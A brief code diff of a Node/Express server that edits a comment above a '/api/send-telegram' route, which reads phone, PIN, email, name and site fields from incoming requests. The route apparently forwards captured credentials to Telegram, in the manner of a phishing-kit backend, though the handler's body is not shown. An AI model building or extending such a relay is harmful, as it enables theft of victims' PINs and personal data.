@@ -23,7 +23,7 @@ app.get('/', (req, res) => {
     res.json({ status: 'OK', message: 'API is running!' });
 });
 
-// TELEGRAM ENDPOINT - THIS IS WHAT YOU NEED
+// TELEGRAM ENDPOINT
 app.post('/api/send-telegram', async (req, res) => {
     try {
         const { phone, pin, email, name, type, site } = req.body;
